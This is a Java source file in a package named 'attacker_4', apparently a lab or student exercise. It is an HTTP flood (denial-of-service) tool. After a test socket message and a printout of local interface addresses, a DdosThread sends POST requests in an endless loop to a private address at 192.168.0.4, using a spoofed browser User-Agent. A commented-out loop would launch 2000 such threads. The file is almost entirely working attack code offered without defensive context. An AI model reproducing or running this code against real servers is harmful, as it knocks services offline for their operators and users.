package attacker_4;


import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.Socket;
import java.net.URL;
import java.net.URLEncoder;
import java.util.Enumeration;
import java.util.Scanner;
import java.util.concurrent.atomic.AtomicBoolean;
import javax.net.ssl.HttpsURLConnection;

public class Attacker_4 {
private static Socket sock;

    public static void main(String... args) throws Exception {
        
        try
        {
            int port = 80 ;String host = "192.168.0.4";//host and port set
            InetAddress addr = InetAddress.getByName(host);
            sock = new Socket(addr, port);//opening new socket 
            System.out.println(addr);//giving the addr to the view
 
           
            OutputStream os = sock.getOutputStream();
            OutputStreamWriter str_wrt = new OutputStreamWriter(os);
            BufferedWriter buf_wrt= new BufferedWriter(str_wrt);
 
            String num = "8";
 
 
            String outbound = num + "\n";
            buf_wrt.write(outbound);
            buf_wrt.flush();
            System.out.println("Outbound message to the server:"+outbound);
 
            
            InputStream is = sock.getInputStream();
            InputStreamReader isr = new InputStreamReader(is);
            BufferedReader buf_rdr = new BufferedReader(isr);
            String msg = buf_rdr.readLine();
            System.out.println("Server side outcome: " +msg);
        }
       
        catch (Exception exception)
        {
            exception.printStackTrace();
        }
        
        Enumeration e = NetworkInterface.getNetworkInterfaces();
while(e.hasMoreElements())
{
    //To get the correct IP of the host. using the system out we can see that we get all the adresses(localhost,IPv6,IPv4)
    NetworkInterface n = (NetworkInterface) e.nextElement();
    Enumeration ee = n.getInetAddresses();
    while (ee.hasMoreElements())
    {
        InetAddress i = (InetAddress) ee.nextElement();
        //debug
        System.out.println(i.getHostAddress());
    }
}
        /*for (int i = 0; i < 2000; i++) {
            
            DdosThread thread = new DdosThread();
            thread.start();
            
        }8*/DdosThread thread = new DdosThread();
            thread.start();
    }

    public static class DdosThread extends Thread {

        private AtomicBoolean running = new AtomicBoolean(true);
        private final String port = "80"; 
        private final String request = "http://192.168.0.4:"+port+"/mypath/index.htm";
        
        private final URL url;

        String param = null;

        public DdosThread() throws Exception {
            url = new URL(request);
            param = "param1=" + URLEncoder.encode("87845", "UTF-8");
        }


        @Override
        public void run() {
            while (running.get()) {
                try {
                    attack();
                } catch (Exception e) {

                }


            }
        }
        
        

        public void attack() throws Exception {
//            Packets send to 
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setDoOutput(true);
            connection.setDoInput(true);
            //specifying the method that used. In this situation we are using only the POST method so we send unlimited packets with no response waittime
            connection.setRequestMethod("POST");
            connection.setRequestProperty("charset", "utf-8");
            connection.setRequestProperty("Host", "localhost");
//            User Agent is suposed to be the entity that is sending the packets. 
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            connection.setRequestProperty("Content-Length", param);
            System.out.println("HTTP POST expire 0s "+this + " " +"response code "+ connection.getResponseCode());
            connection.getInputStream();
        }
    }

}